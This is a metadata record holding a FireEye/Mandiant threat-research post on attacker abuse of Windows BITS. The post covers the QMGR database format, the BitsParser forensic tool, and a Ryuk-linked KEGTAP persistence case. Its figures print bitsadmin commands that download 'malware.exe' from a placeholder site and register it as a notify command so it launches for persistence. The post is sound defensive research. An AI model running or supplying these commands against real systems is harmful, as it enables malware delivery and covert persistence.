{
    "id": "9b678726-4dd6-43e4-ad6e-0139bd0c5edc",
    "created_at": "2023-01-12T15:09:31.724623Z",
    "updated_at": "2025-03-27T02:05:48.123515Z",
    "deleted_at": null,
    "sha1_hash": "83280a80cab973da45a7c2b7230c34786d6bd784",
    "title": "2021-03-31 - Back in a Bit- Attacker Use of the Windows Background Intelligent Transfer Service",
    "authors": "",
    "file_creation_date": "2022-05-29T01:11:19Z",
    "file_modification_date": "2022-05-29T01:11:19Z",
    "file_size": 98913,
    "plain_text": "# Back in a Bit: Attacker Use of the Windows Background Intelligent Transfer Service\n\n**[fireeye.com/blog/threat-research/2021/03/attacker-use-of-windows-background-intelligent-transfer-service.html](https://www.fireeye.com/blog/threat-research/2021/03/attacker-use-of-windows-background-intelligent-transfer-service.html)**\n\nThreat Research\n\nDavid Via, Scott Runnels\n\nMar 31, 2021\n\n10 mins read\n\nThreat Research\n\nIn this blog post we will describe:\n\nHow attackers use the Background Intelligent Transfer Service (BITS)\nForensic techniques for detecting attacker activity with data format specifications\n[Public release of the BitsParser tool](https://github.com/fireeye/BitsParser)\nA real-world example of malware using BITS persistence\n\n\n-----\n\n**Introduction**\n\nMicrosoft introduced the Background Intelligent Transfer Service (BITS) with Windows XP to simplify\nand coordinate downloading and uploading large files. Applications and system components, most\nnotably Windows Update, use BITS to deliver operating system and application updates so they can\nbe downloaded with minimal user disruption.\n\nApplications interact with the Background Intelligent Transfer Service by creating jobs with one or\nmore files to download or upload. The BITS service runs in a service host process and can schedule\ntransfers to occur at any time. Job, file, and state information is stored in a local database.\n\n**How Attackers Use BITS**\n\nAs is the case with many technologies, BITS can be used both by legitimate applications and by\nattackers. When malicious applications create BITS jobs, files are downloaded or uploaded in the\ncontext of the service host process. This can be useful for evading firewalls that may block malicious\nor unknown processes, and it helps to obscure which application requested the transfer. BITS\ntransfers can also be scheduled allowing them to occur at specific times without relying on longrunning processes or the task scheduler.\n\nBITS transfers are asynchronous, which can result in situations where the application that created a\njob may not be running when the requested transfers complete. To address this scenario BITS jobs\ncan be created with a user-specified notification command, which will be executed after the job\ncompletes or in case of errors. The notification commands associated with BITS jobs can specify any\nexecutable or command to run. Attackers have utilized this feature as a method for maintaining\npersistence of malicious applications.\n\nSince the command data for BITS jobs is stored to a database rather than traditional registry\nlocations, it can be overlooked by tools that attempt to identify persistence executables and\ncommands or by forensic investigators.\n\nBITS jobs can be created using API function calls or via the bitsadmin command line tool. See\nFigure 1 and Figure 2 for an example of how a BITS job can be used to download a file and trigger\nexecution.\n\n - bitsadmin /create download\n\n - bitsadmin /addfile download https://<site>/malware.exe c:\\windows\\malware.exe\n\n - bitsadmin /resume download\n\n - bitsadmin /complete download\n\nCreated job {EA8603EB-7CC2-44EC-B1EE-E9923290C2ED}.\n\nAdded https://<site>/malware.exe -> c:\\windows\\malware.exe to job.\n\nJob resumed.\n\nJob completed.\n\nFigure 1: Using bitsadmin to create a job that downloads a malicious executable and stores it to\nc:\\windows\\malware.exe.\n\n\n-----\n\n - bitsadmin /create persistence\n\n - bitsadmin /addfile persistence http://127.0.0.1/invalid.exe c:\\windows\\i.exe\n\n - bitsadmin /SetNotifyCmdLine persistence c:\\windows\\malware.exe NULL\n\n - bitsadmin /resume persistence\n\nUsing bitsadmin to create a job that will launch malware.exe after attempting to\ndownload an invalid URL.\n\n\nFigure 2:\n\nUsing bitsadmin to create a job that will launch malware.exe after attempting to download an invalid\nURL.\n\n**Creating BitsParser**\n\nThrough our investigations, Mandiant consultants identified evidence of attackers leveraging BITS\nacross multiple campaigns. In order to search for evidence of attacker use of BITS, we needed to\nunderstand the underlying infrastructure used by BITS and create a tool that could collect relevant\ninformation.\n\n[We created BitsParser, which parses BITS databases and returns information about jobs executed](https://github.com/fireeye/BitsParser)\non endpoint systems. The tool can be run internally by Mandiant consultants via our endpoint agent\nallowing BITS data to be acquired from many hosts across an enterprise. BitsParser has been\nsuccessfully used in many investigations to uncover attacker downloads, uploads, and persistence.\n\n\n-----\n\n[In order to process the custom database format, BitsParser utilizes the open source ANSSI-FR](https://github.com/ANSSI-FR/bits_parser)\nlibrary. The library allows parsing of both active and deleted entries from BITS database files, and it\ncan fully extract relevant information from job and file records.\n\n**The QMGR Database**\n\nBITS jobs and associated state information are stored in local “queue manager” (QMGR) database\nfiles in the %ALLUSERSPROFILE%\\Microsoft\\Network\\Downloader directory. The database is\nstored to files named qmgr0.dat and qmgr1.dat. The two-file scheme appears to be used for back up\nand synchronization purposes. The second file largely contains duplicate job and file information,\nthough some unique or older entries can be found in the file.\n\n**Windows 10 Changes**\n\nThe Background Intelligent Transfer Service has largely remained unchanged since its introduction.\nHowever, Windows 10 introduced significant changes to the service, including an all new database\nformat. On Windows 10 the QMGR database is stored using the Extensible Storage Engine (ESE)\nformat. ESE databases have been used in many other Microsoft products including Exchange,\nActive Directory, and Internet Explorer.\n\nWindows 10 stores the QMGR database in a single file called qmgr.db. Separate transaction log files\nare maintained in the same directory. The most recent transaction log is stored to a file called\nedb.log, and three older transaction logs with numerical suffixes are typically present.\n\n**Parsing ESE Databases**\n\nIn order to support investigations on Windows 10 systems, we updated the BitsParser tool to support\nthe new QMGR database format. To accomplish this, we needed a Python-based ESE database\nparser. Research led us to [libesedb, which is a full ESE database implementation written in C with a](https://github.com/libyal/libesedb)\nPython wrapper. With no other Python options available, we initially used libesedb in BitsParser to\nparse the Windows 10 QMGR database. However, we sought a solution that did not rely on native\nexecutables and would be more compact for improved efficiency in large scale deployments.\n\n[The only pure Python ESE database implementation we identified was part of the Impacket network](https://github.com/SecureAuthCorp/impacket)\ntoolset. Although the source code could perform basic database enumeration, it lacked key features,\nincluding the ability to process long values. Since the QMGR database includes entries large enough\nto require long values, modification of the Impacket implementation was required. We adapted the\nImpacket ESE database parsing code to make it more robust and support all features necessary for\nparsing QMGR databases. The full Python solution allows database parsing in a much smaller\npackage without the risks and limitations of native code.\n\n**Database Structure**\n\nThe Windows 10 QMGR database contains two tables: Jobs and Files. Both tables have two\ncolumns: Id and Blob. The Id contains a GUID to identify the entry, and the Blob contains binary data\nwhich defines the job or file. Fortunately, the job and file structures are largely unchanged from the\nprevious database format.\n\nJob data starts with the control structure:\n\n\n-----\n\n**Offset** **Field** **Size**\n\n0 Type 4\n\n4 Priority 4\n\n8 State 4\n\n...\n\n16 Job ID (GUID) 16\n\n32 Name (UTF-16) variable\n\nvariable Description (UTF-16) variable\n\nvariable Command (UTF-16) variable\n\nvariable Arguments (UTF-16) variable\n\nvariable User SID (UTF-16) variable\n\nvariable Flags 4\n\nFollowing the control structure is a list of files delimited by the XFER GUID, {7756DA36-516F-435AACAC-44A248FFF34D}. The list begins with a 4-byte file count followed by a list of GUIDs, which\ncorrespond to Id values in the Files table.\n\nThe file data uses the following structure:\n\n**Field** **Size**\n\nDestination Filename (UTF-16) variable\n\nSource Filename (UTF-16) variable\n\nTemporary Filename (UTF-16) variable\n\nDownload Size 8\n\n\n-----\n\nTransfer Size 8\n\n_unknown_ 1\n\nDrive (UTF-16) variable\n\nVolume GUID (UTF-16) variable\n\nThe database is processed by enumerating entries in the Jobs table, parsing each job data, finding\ncorrelated files, and parsing the corresponding records in the Files table. This allows the BitsParser\nto combine related information and output jobs with their associated files including relevant\nmetadata.\n\n**Recovering Deleted Records**\n\nActive jobs have entries in the Jobs and Files tables. Records are deleted upon job completion or\ncancellation. As with other filesystem and data formats, deleted entries are not immediately\noverwritten and can often be recovered for some time after deletion.\n\nThe following algorithm is used to recover deleted jobs and files from Windows 10 QMGR\ndatabases:\n\n1. Locate file records by searching for the file identifier GUID, {519ECFE4-D946-4397-B73E\n268513051AB2}. Attempt to parse the following data as a normal file record.\n2. Locate job records by searching for job identifier GUIDs. Attempt to parse the following data as\n\na normal job record. Handle incomplete job entries by parsing just the control structure and\nmanually locate associated files if required.\n\nThe following job GUIDs have been observed in QMGR databases:\n\n1. {E10956A1-AF43-42C9-92E6-6F9856EBA7F6}\n2. {4CD4959F-7064-4BF2-84D7-476A7E62699F}\n3. {A92619F1-0332-4CBF-9427-898818958831}\n4. {DDBC33C1-5AFB-4DAF-B8A1-2268B39D01AD}\n5. {8F5657D0-012C-4E3E-AD2C-F4A5D7656FAF}\n6. {94416750-0357-461D-A4CC-5DD9990706E4}\n3. Correlate carved file records to carved jobs. Process all remaining carved file records that\n\ncould not be correlated to active or deleted jobs.\n\nHistoric records can also be found in transaction log files. Although we do not parse the transaction\nlog structures, the same algorithm can be used to find job and file records within the logs by\nsearching for appropriate GUIDs. While the same records may be present in multiple files, duplicates\ncan be suppressed to prevent output of redundant information.\n\n**BitsParser Tool Release**\n\n\n-----\n\nAt the time of writing we are not aware of any open source tools available to parse BITS databases\nand extract data useful for incident response and forensic investigations. To help address this and\nfoster further research, FireEye has decided to release a standalone version of BitsParser. This\ncommand line utility can process all versions of BITS databases and perform carving to recover\ndeleted job and file information.\n\n[Source code for BitsParser can be found at our GitHub page.](https://github.com/fireeye/BitsParser)\n\nNote that on Windows 10 the QMGR database files are opened without sharing by the BITS service\nthus preventing other programs from directly opening them. When BitsParser is deployed via the\nFireEye endpoint agent it can directly parse the local filesystem and raw read files in circumstances\nwhere they cannot be directly read. The standalone BitsParser does not have this ability. The BITS\nservice should be stopped prior to running BitsParser or third-party tools for copying locked files may\nbe utilized.\n\n**BITS Persistence in the Wild**\n\nIn 2020 Mandiant responded to many incidents involving Ryuk ransomware operators leveraging\ncustom backdoors and loaders to actively target hospitals and other medical support centers (see\n[our blog post Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser).](https://www.fireeye.com/resources/kegtap-and-singlemalt-with-a-ransomware-chaser)\nThrough numerous engagements Mandiant was able to profile the attacker's Tools Techniques and\nProcedures (TTPs) and identify unique aspects of the various backdoors and loaders that were\nleveraged prior to encryption. In one such engagement, Mandiant consultants had mapped the vast\nmajority of the attack timeline from initial exploitation to the encryption of corporate resources and an\nextortion demand. Log analysis and telemetry provided by the customer's on-premises endpoint\ndetection solution led to the identification of a KEGTAP backdoor on an end-user workstation.\nMandiant was able to identify the specific email and lure used by the ransomware operators\nincluding the download and execution of the file mail.exe, which launched KEGTAP. However, none\nof the persistence mechanisms that Mandiant observed in other engagements were present on this\nendpoint.\n\nA full understanding of the persistence mechanism would allow Mandiant to hunt for additional\nevidence of attacker activity across the environment and in other engagements. As focus intensified,\nMandiant consultants identified evidence to indicate that the BITS service launched the KEGTAP\nbackdoor. Analysts identified entries in the Microsoft-Windows-Bits-Client operational event log\nwhich associated the BITS service activity with the file mail.exe.\n\n3 | Information | The BITS service created a new job: System update, with owner REDACTED\n\n61 | Warning | BITS stopped transferring the System update transfer job that is associated with the\nhttp://127.0.0.1/tst/56/ URL. The status code is 2147954429.\n\n64 | Warning | The BITS job System update is configured to launch\nC:\\Users\\REDACTED\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\REDACTED\\mail.exe after\ntransfer of http://127.0.0.1/tst/12/. The service failed to launch the program with error 2147942402,\nBITS will continue trying to launch the program periodically until it succeeds.\n\nFigure 3: Event log entries showing the creation of a BITS job for persistence\n\n\n-----\n\nMandiant consultants were able to confirm the details of the BITS job by interacting with the host and\nexamining the QMGR database. The malicious BITS job was set to attempt an HTTP transfer of a\nnonexistent file from the local host. As this file would never exist, BITS would trigger the error state\nand launch the notify command, which in this case was KEGTAP.\n\nUnfortunately, while this was successful in identifying a previously unknown persistence mechanism\nassociated with this threat group, manual QMGR database analysis would not scale across multiple\nsystems or environments. Adapting the existing BitsParser to parse the Windows 10 version of the\nQMGR database enabled Mandiant consultants to efficiently identify additional infected systems\nacross multiple environments.\n\n{\n\"JobType\": \"download\",\n\"JobPriority\": \"normal\",\n\"JobState\": \"queued\",\n\"JobName\": \"System update\",\n\"CommandExecuted\":\n\"C:\\\\Users\\\\REDACTED\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\REDACTED\\\\mail.exe\",\n\"Files\": [\n{\n\"DestFile\":\n\"C:\\\\Users\\\\REDACTED\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\REDACTED\\\\mail.exe\",\n\"SourceURL\": \"http://127.0.0.1/tst/56/\",\n\"DownloadByteSize\": 0\n}\n]\n}\n\nFigure 4: BitsParser output shows the malicious BITS job launching mail.exe\n\n**Conclusion**\n\nThe Background Intelligent Transfer Service continues to provide utility to applications and attackers\nalike. The BITS QMGR database can present a useful source of data in an investigation or hunting\n[operation. BitsParser may be utilized with other forensic tools to develop a detailed view of attacker](https://github.com/fireeye/BitsParser)\nactivity.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-03-31 - Back in a Bit- Attacker Use of the Windows Background Intelligent Transfer Service.pdf"
    ],
    "report_names": [
        "2021-03-31 - Back in a Bit- Attacker Use of the Windows Background Intelligent Transfer Service.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536171,
    "ts_updated_at": 1743041148,
    "ts_creation_date": 1653786679,
    "ts_modification_date": 1653786679,
    "files": {
        "pdf": "https://archive.orkl.eu/83280a80cab973da45a7c2b7230c34786d6bd784.pdf",
        "text": "https://archive.orkl.eu/83280a80cab973da45a7c2b7230c34786d6bd784.txt",
        "img": "https://archive.orkl.eu/83280a80cab973da45a7c2b7230c34786d6bd784.jpg"
    }
}